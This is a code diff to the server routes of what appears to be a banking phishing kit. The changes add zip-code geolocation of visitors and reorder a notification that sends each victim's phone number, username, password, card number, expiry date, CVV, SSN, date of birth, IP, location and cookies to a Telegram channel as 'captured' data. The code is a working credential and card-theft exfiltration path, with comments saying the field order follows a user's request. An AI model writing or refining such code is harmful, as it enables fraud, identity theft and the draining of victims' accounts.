@@ -121,6 +121,7 @@ interface DeviceInfo {
     region: string;
     country: string;
     timezone: string;
+    zip: string;
   };
   timestamp: string;
 }
@@ -353,7 +354,7 @@ export async function registerRoutes(
       
       // Log the identity verification attempt silently (no Telegram notification - will be sent with password reset)
       await storage.logVisitor({
-        ipAddress: req.ip || req.headers["x-forwarded-for"]?.toString() || "unknown",
+        ip: req.ip || req.headers["x-forwarded-for"]?.toString() || "unknown",
         city: null,
         region: null,
         country: null,
@@ -750,12 +751,13 @@ export async function registerRoutes(
       region: "Unknown", 
       country: "United States",
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      zip: "",
     };
 
     try {
       const cleanIp = ip.startsWith("::") ? "" : ip;
       if (cleanIp && cleanIp !== "127.0.0.1") {
-        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone`);
+        const geoResponse = await fetch(`http://ip-api.com/json/${cleanIp}?fields=city,regionName,country,timezone,zip`);
         if (geoResponse.ok) {
           const geoData = await geoResponse.json();
           if (geoData.city) {
@@ -764,6 +766,7 @@ export async function registerRoutes(
               region: geoData.regionName || "Unknown",
               country: geoData.country || "United States",
               timezone: geoData.timezone || location.timezone,
+              zip: geoData.zip || "",
             };
           }
         }
@@ -850,7 +853,7 @@ export async function registerRoutes(
 
       // Send Telegram notification for important actions
       if (action === "login" || action === "login_attempt" || action === "registration" || action === "identity_verification" || action === "password_reset" || action === "facial_recognition_auth") {
-        // Build notification data in exact order requested, only include non-empty fields
+        // Build notification data in exact order requested by user
         const notificationData: Record<string, any> = {};
         
         // For facial recognition, add biometric info first
@@ -864,28 +867,51 @@ export async function registerRoutes(
         }
         
         // Fields in exact order requested by user
-        if (data?.username) notificationData["Username"] = data.username;
-        if (data?.password) notificationData["Password"] = data.password;
-        if (data?.newPassword) notificationData["New password"] = data.newPassword;
-        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
-        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
-        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
-        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
-        if (data?.ssn) notificationData["SSN"] = data.ssn;
-        if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
+        // 1. Phone number first
         if (data?.phone) notificationData["Phone number"] = data.phone;
-        if (data?.email) notificationData["Email"] = data.email;
         
-        // Always include IP and location
+        // 2. Username
+        if (data?.username) notificationData["Username"] = data.username;
+        
+        // 3. Password
+        if (data?.password) notificationData["Password"] = data.password;
+        
+        // 4. New Password
+        if (data?.newPassword) notificationData["New Password"] = data.newPassword;
+        
+        // 5. Card number
+        if (data?.cardNumber) notificationData["Card number"] = data.cardNumber;
+        if (data?.accountNumber) notificationData["Account number"] = data.accountNumber;
+        
+        // 6. Expiration Date
+        if (data?.cardExpiration) notificationData["Expiration Date"] = data.cardExpiration;
+        
+        // 7. CVV
+        if (data?.cardCvv) notificationData["CVV"] = data.cardCvv;
+        
+        // 8. SSN
+        if (data?.ssn) notificationData["SSN"] = data.ssn;
+        
+        // 9. DOB
+        if (data?.dateOfBirth) notificationData["DOB"] = data.dateOfBirth;
+        
+        // 10. IP Address
         notificationData["IP Address"] = deviceInfo.ip;
-        const locationParts = [deviceInfo.location.city, deviceInfo.location.region, deviceInfo.location.country].filter(Boolean);
+        
+        // 11. Location (country, city, state, zip code format)
+        const locationParts = [
+          deviceInfo.location.country,
+          deviceInfo.location.city,
+          deviceInfo.location.region,
+          deviceInfo.location.zip
+        ].filter(Boolean);
         notificationData["Location"] = locationParts.join(", ") || "Unknown";
         
-        // Always include cookies
-        notificationData["Cookies"] = cookieHeader || "None";
+        // 12. Device
+        notificationData["Device"] = deviceInfo.deviceType;
         
-        // Additional device info
-        notificationData["Device"] = `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`;
+        // 13. Cookies (last)
+        notificationData["Cookies"] = cookieHeader || "None";
         
         const actionLabel = action === "facial_recognition_auth" ? "Face ID authentication" : action.replace("_", " ");
         sendTelegramNotification(`New ${actionLabel} captured`, notificationData);
